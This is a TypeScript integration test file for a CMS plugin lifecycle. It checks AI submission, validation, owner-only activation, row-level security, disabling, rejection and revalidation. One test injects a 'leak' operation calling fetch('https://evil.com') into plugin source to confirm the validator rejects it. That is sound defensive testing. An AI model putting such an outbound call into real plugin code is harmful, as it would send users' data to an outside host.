// SPDX-License-Identifier: MPL-2.0

/**
 * P11 — plugins lifecycle integration tests.
 *   - submit (AI) → status='awaiting_activation' for a clean Tier 2 plugin.
 *   - submit with forbidden patterns → status='draft' + structured errors.
 *   - submit with manifest declaring tier:1 → HandlerError (AI cannot promote).
 *   - submit with requestedCapabilities → manifest-tier2-cap-leak rejection.
 *   - AI cannot activate (ActorScopeRejected).
 *   - Owner activates → schema row recorded + status='active'.
 *   - disable → status='disabled', activate again succeeds re-enable.
 *   - revalidate (after a Caelo upgrade) re-runs the validator over the stored source.
 *   - reject deletes a Tier 2 awaiting_activation row.
 */

import { afterAll, afterEach, beforeAll, describe, expect, it } from "bun:test";
import { schemaFromSpec } from "@caelo-cms/plugin-sandbox";
import { DatabaseAdapter, execute, OperationRegistry } from "@caelo-cms/query-api";
import type { ExecutionContext } from "@caelo-cms/shared";
import { SQL } from "bun";
import { sql } from "drizzle-orm";
import { registerAdminOps } from "../register.js";

const ADMIN_URL = process.env.ADMIN_DATABASE_URL;
const PUBLIC_URL = process.env.PUBLIC_ADMIN_DATABASE_URL;
if (!ADMIN_URL || !PUBLIC_URL) throw new Error("DB URLs required");

let adapter: DatabaseAdapter;
let registry: OperationRegistry;

const systemCtx: ExecutionContext = {
  actorId: "00000000-0000-0000-0000-00000000ffff",
  actorKind: "system",
  requestId: "plugins-test",
};
const aiCtx: ExecutionContext = { ...systemCtx, actorKind: "ai" };

const HELLO_SLUG = "test-p11-hello";

const helloManifest = {
  slug: HELLO_SLUG,
  version: "0.0.1",
  tier: 2,
  schema: {
    greetings: {
      id: "uuid",
      page_id: "string",
      locale: "string",
      message: "string",
      created_at: "timestamp",
    },
  },
  operations: ["submit", "list"],
  hasStaticRender: true,
};

const helloSource = `
import { definePlugin, defineComponent } from "@caelo-cms/plugin-sdk";
export default definePlugin({
  slug: "${HELLO_SLUG}",
  version: "0.0.1",
  tier: 2,
  schema: {
    greetings: {
      id: "uuid",
      page_id: "string",
      locale: "string",
      message: "string",
      created_at: "timestamp",
    },
  },
  operations: {
    submit: async ({ query }, data) => query.insert("greetings", data),
    list: async ({ query }, args) => query.list("greetings", args),
  },
});
`;

async function wipe(): Promise<void> {
  const sql = new SQL(ADMIN_URL);
  try {
    await sql.begin(async (tx) => {
      await tx.unsafe("SET LOCAL caelo.actor_kind = 'system'");
      await tx`DELETE FROM plugin_schema_migrations WHERE plugin_id IN (SELECT id FROM plugins WHERE slug LIKE 'test-p11-%')`;
      await tx`DELETE FROM actors WHERE plugin_id IN (SELECT id FROM plugins WHERE slug LIKE 'test-p11-%')`;
      await tx`DELETE FROM plugins WHERE slug LIKE 'test-p11-%'`;
    });
  } finally {
    await sql.end();
  }
  const pub = new SQL(PUBLIC_URL);
  try {
    await pub.unsafe(`DROP SCHEMA IF EXISTS plugin_test_p11_hello CASCADE`);
  } finally {
    await pub.end();
  }
}

/**
 * Test helper that mirrors the route handler's three-step orchestration:
 * prepare → adapter.provisionPluginPublicSchema → activate(commit).
 */
async function fullActivate(slug: string): Promise<void> {
  const prep = await execute(registry, adapter, systemCtx, "plugins.prepare_activation", {
    slug,
  });
  if (!prep.ok) throw new Error(`prepare failed: ${prep.error.kind}`);
  const prepared = prep.value as {
    pluginId: string;
    version: string;
    schemaName: string;
    appliedSql: string;
    isReEnable: boolean;
  };
  if (!prepared.isReEnable) {
    await adapter.provisionPluginPublicSchema({
      pluginId: prepared.pluginId,
      sql: prepared.appliedSql,
    });
  }
  const commit = await execute(registry, adapter, systemCtx, "plugins.activate", {
    slug,
    schemaName: prepared.isReEnable ? undefined : prepared.schemaName,
    appliedSql: prepared.isReEnable ? undefined : prepared.appliedSql,
    version: prepared.isReEnable ? undefined : prepared.version,
  });
  if (!commit.ok) throw new Error(`commit failed: ${commit.error.kind}`);
}

beforeAll(async () => {
  await wipe();
  adapter = new DatabaseAdapter({ adminDatabaseUrl: ADMIN_URL, publicDatabaseUrl: PUBLIC_URL });
  registry = new OperationRegistry();
  registerAdminOps(registry);
});

afterEach(async () => {
  await wipe();
});

afterAll(async () => {
  await adapter.close();
});

describe("plugins.submit", () => {
  it("AI submits hello-world; status='awaiting_activation'", async () => {
    const r = await execute(registry, adapter, aiCtx, "plugins.submit", {
      slug: HELLO_SLUG,
      version: "0.0.1",
      manifest: helloManifest,
      source: helloSource,
    });
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    const v = r.value as {
      pluginId: string;
      status: string;
      validationErrors: { kind: string }[];
    };
    expect(v.status).toBe("awaiting_activation");
    expect(v.validationErrors).toHaveLength(0);
  });

  it("forbidden patterns push status back to 'draft' with structured errors", async () => {
    const evilSource = helloSource.replace(
      "operations: {",
      `operations: {
        leak: async () => { await fetch("https://evil.com"); },`,
    );
    const r = await execute(registry, adapter, aiCtx, "plugins.submit", {
      slug: HELLO_SLUG,
      version: "0.0.1",
      manifest: { ...helloManifest, operations: ["submit", "list", "leak"] },
      source: evilSource,
    });
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    const v = r.value as {
      status: string;
      validationErrors: { kind: string; hint: string }[];
    };
    expect(v.status).toBe("draft");
    expect(v.validationErrors.some((e) => e.kind === "forbidden-call")).toBe(true);
    // Hint must be AI-actionable.
    expect(v.validationErrors[0]?.hint).toContain("ctx.api");
  });

  it("manifest declaring tier:1 is rejected — AI cannot promote", async () => {
    const r = await execute(registry, adapter, aiCtx, "plugins.submit", {
      slug: HELLO_SLUG,
      version: "0.0.1",
      manifest: { ...helloManifest, tier: 1 },
      source: helloSource,
    });
    expect(r.ok).toBe(false);
    if (r.ok) return;
    expect(r.error.kind).toBe("HandlerError");
  });

  it("manifest with requestedCapabilities is rejected as tier-2 cap leak", async () => {
    const r = await execute(registry, adapter, aiCtx, "plugins.submit", {
      slug: HELLO_SLUG,
      version: "0.0.1",
      manifest: { ...helloManifest, requestedCapabilities: ["cms_admin"] },
      source: helloSource,
    });
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    const v = r.value as { status: string; validationErrors: { kind: string }[] };
    expect(v.status).toBe("draft");
    expect(v.validationErrors.some((e) => e.kind === "manifest-tier2-cap-leak")).toBe(true);
  });
});

describe("plugins.activate", () => {
  it("AI cannot activate (ActorScopeRejected)", async () => {
    await execute(registry, adapter, aiCtx, "plugins.submit", {
      slug: HELLO_SLUG,
      version: "0.0.1",
      manifest: helloManifest,
      source: helloSource,
    });
    const r = await execute(registry, adapter, aiCtx, "plugins.activate", { slug: HELLO_SLUG });
    expect(r.ok).toBe(false);
    if (r.ok) return;
    expect(r.error.kind).toBe("ActorScopeRejected");
  });

  it("Owner activates via prepare → provision → commit → status='active' + actor row created", async () => {
    await execute(registry, adapter, aiCtx, "plugins.submit", {
      slug: HELLO_SLUG,
      version: "0.0.1",
      manifest: helloManifest,
      source: helloSource,
    });
    await fullActivate(HELLO_SLUG);

    const get = await execute(registry, adapter, systemCtx, "plugins.get", { slug: HELLO_SLUG });
    if (!get.ok) return;
    const plugin = (get.value as { plugin: { id: string; status: string; tier: number } | null })
      .plugin;
    expect(plugin?.status).toBe("active");
    expect(plugin?.tier).toBe(2);

    // Per-plugin actor row created (opt 2). RLS on actors requires a
    // session var to read; use the system-scoped withAdminTransaction.
    const actors = await adapter.withAdminTransaction(systemCtx, async (tx) => {
      const rows = (await tx.execute(
        sql`SELECT id::text AS id, kind, display_name FROM actors WHERE plugin_id = ${plugin?.id ?? ""}::uuid`,
      )) as unknown as { id: string; kind: string; display_name: string }[];
      return rows;
    });
    expect(actors).toHaveLength(1);
    expect(actors[0]?.kind).toBe("plugin");
    expect(actors[0]?.display_name).toContain(HELLO_SLUG);
  });

  it("commit failure rolls back cms_public schema (atomicity)", async () => {
    await execute(registry, adapter, aiCtx, "plugins.submit", {
      slug: HELLO_SLUG,
      version: "0.0.1",
      manifest: helloManifest,
      source: helloSource,
    });
    const prep = await execute(registry, adapter, systemCtx, "plugins.prepare_activation", {
      slug: HELLO_SLUG,
    });
    if (!prep.ok) throw new Error("prepare failed");
    const prepared = prep.value as {
      pluginId: string;
      schemaName: string;
      appliedSql: string;
    };
    await adapter.provisionPluginPublicSchema({
      pluginId: prepared.pluginId,
      sql: prepared.appliedSql,
    });
    // Force a commit failure by passing a wrong version.
    const commit = await execute(registry, adapter, systemCtx, "plugins.activate", {
      slug: HELLO_SLUG,
      schemaName: prepared.schemaName,
      appliedSql: prepared.appliedSql,
      version: "9.9.9",
    });
    expect(commit.ok).toBe(false);

    // Rollback the cms_public schema (mirroring the route handler's rollback).
    await adapter.dropPluginPublicSchema({ schemaName: prepared.schemaName });
    const pub = adapter.rawPublic();
    const remaining = (await pub`
      SELECT schema_name FROM information_schema.schemata WHERE schema_name = ${prepared.schemaName}
    `) as unknown as { schema_name: string }[];
    expect(remaining).toHaveLength(0);
  });

  it("provisionPluginPublicSchema actually creates the cms_public schema + table with FORCE RLS", async () => {
    // Submit + read the plugin so we know its id.
    const submit = await execute(registry, adapter, aiCtx, "plugins.submit", {
      slug: HELLO_SLUG,
      version: "0.0.1",
      manifest: helloManifest,
      source: helloSource,
    });
    expect(submit.ok).toBe(true);
    if (!submit.ok) return;
    const pluginId = (submit.value as { pluginId: string }).pluginId;
    const emitted = schemaFromSpec({
      pluginId,
      slug: HELLO_SLUG,
      schema: helloManifest.schema,
    });
    await adapter.provisionPluginPublicSchema({ pluginId, sql: emitted.sql });

    // Verify schema + table exist with FORCE RLS + per-plugin policy.
    const pub = adapter.rawPublic();
    const schemas = (await pub`
      SELECT schema_name FROM information_schema.schemata
      WHERE schema_name = ${emitted.schemaName}
    `) as unknown as { schema_name: string }[];
    expect(schemas).toHaveLength(1);

    const tables = (await pub`
      SELECT table_name FROM information_schema.tables
      WHERE table_schema = ${emitted.schemaName} AND table_name = 'greetings'
    `) as unknown as { table_name: string }[];
    expect(tables).toHaveLength(1);

    const policies = (await pub`
      SELECT polname, pg_get_expr(polqual, polrelid) AS pol
      FROM pg_policy p JOIN pg_class c ON c.oid = p.polrelid
      JOIN pg_namespace n ON n.oid = c.relnamespace
      WHERE n.nspname = ${emitted.schemaName} AND c.relname = 'greetings'
    `) as unknown as { polname: string; pol: string }[];
    expect(policies.length).toBeGreaterThan(0);
    expect(policies[0]?.pol).toContain(pluginId);
    expect(policies[0]?.pol).toContain("caelo.plugin_id");

    const rls = (await pub`
      SELECT relrowsecurity, relforcerowsecurity
      FROM pg_class c JOIN pg_namespace n ON n.oid = c.relnamespace
      WHERE n.nspname = ${emitted.schemaName} AND c.relname = 'greetings'
    `) as unknown as { relrowsecurity: boolean; relforcerowsecurity: boolean }[];
    expect(rls[0]?.relrowsecurity).toBe(true);
    expect(rls[0]?.relforcerowsecurity).toBe(true);
  });

  it("disabled → activate re-enables without re-provisioning", async () => {
    await execute(registry, adapter, aiCtx, "plugins.submit", {
      slug: HELLO_SLUG,
      version: "0.0.1",
      manifest: helloManifest,
      source: helloSource,
    });
    await execute(registry, adapter, systemCtx, "plugins.activate", { slug: HELLO_SLUG });
    await execute(registry, adapter, systemCtx, "plugins.disable", { slug: HELLO_SLUG });
    await fullActivate(HELLO_SLUG); // re-enable path: isReEnable=true skips DDL.
    const get = await execute(registry, adapter, systemCtx, "plugins.get", { slug: HELLO_SLUG });
    if (!get.ok) return;
    const plugin = (get.value as { plugin: { status: string; activatedAt: string | null } | null })
      .plugin;
    expect(plugin?.status).toBe("active");
    expect(plugin?.activatedAt).not.toBeNull();
  });

  it("activate refuses non-existent plugin", async () => {
    const r = await execute(registry, adapter, systemCtx, "plugins.activate", {
      slug: "test-p11-nope",
    });
    expect(r.ok).toBe(false);
    if (r.ok) return;
    expect(r.error.kind).toBe("HandlerError");
  });
});

describe("plugins.disable + reject + revalidate", () => {
  it("disable flips active → disabled", async () => {
    await execute(registry, adapter, aiCtx, "plugins.submit", {
      slug: HELLO_SLUG,
      version: "0.0.1",
      manifest: helloManifest,
      source: helloSource,
    });
    await fullActivate(HELLO_SLUG);
    const r = await execute(registry, adapter, systemCtx, "plugins.disable", { slug: HELLO_SLUG });
    expect(r.ok).toBe(true);
    const get = await execute(registry, adapter, systemCtx, "plugins.get", { slug: HELLO_SLUG });
    if (!get.ok) return;
    expect((get.value as { plugin: { status: string } | null }).plugin?.status).toBe("disabled");
  });

  it("reject flips status='rejected' (preserves audit + reason; opt 5)", async () => {
    await execute(registry, adapter, aiCtx, "plugins.submit", {
      slug: HELLO_SLUG,
      version: "0.0.1",
      manifest: helloManifest,
      source: helloSource,
    });
    const r = await execute(registry, adapter, systemCtx, "plugins.reject", {
      slug: HELLO_SLUG,
      reason: "rename to feedback",
    });
    expect(r.ok).toBe(true);
    const get = await execute(registry, adapter, systemCtx, "plugins.get", { slug: HELLO_SLUG });
    if (!get.ok) return;
    const plugin = (
      get.value as {
        plugin: {
          status: string;
          rejectionReason: string | null;
          sourceCode: string | null;
        } | null;
      }
    ).plugin;
    expect(plugin?.status).toBe("rejected");
    expect(plugin?.rejectionReason).toBe("rename to feedback");
    expect(plugin?.sourceCode).not.toBeNull();
  });

  it("plugins.list_pending surfaces AI's own pending + rejected entries (opt 4)", async () => {
    const submit = await execute(registry, adapter, aiCtx, "plugins.submit", {
      slug: HELLO_SLUG,
      version: "0.0.1",
      manifest: helloManifest,
      source: helloSource,
    });
    expect(submit.ok).toBe(true);
    const r = await execute(registry, adapter, aiCtx, "plugins.list_pending", {
      submittedBy: aiCtx.actorId,
    });
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    const rows = (
      r.value as {
        plugins: Array<{ slug: string; status: string; rejectionReason: string | null }>;
      }
    ).plugins;
    expect(rows.some((p) => p.slug === HELLO_SLUG && p.status === "awaiting_activation")).toBe(
      true,
    );
  });

  it("revalidate re-runs the validator over stored source", async () => {
    await execute(registry, adapter, aiCtx, "plugins.submit", {
      slug: HELLO_SLUG,
      version: "0.0.1",
      manifest: helloManifest,
      source: helloSource,
    });
    const r = await execute(registry, adapter, systemCtx, "plugins.revalidate", {
      slug: HELLO_SLUG,
    });
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    expect((r.value as { status: string }).status).toBe("awaiting_activation");
  });
});

describe("plugins.list / get", () => {
  it("list filters by tier + status", async () => {
    await execute(registry, adapter, aiCtx, "plugins.submit", {
      slug: HELLO_SLUG,
      version: "0.0.1",
      manifest: helloManifest,
      source: helloSource,
    });
    const r = await execute(registry, adapter, aiCtx, "plugins.list", { tier: 2 });
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    const plugins = (r.value as { plugins: { slug: string; tier: number }[] }).plugins;
    expect(plugins.some((p) => p.slug === HELLO_SLUG && p.tier === 2)).toBe(true);
  });
});
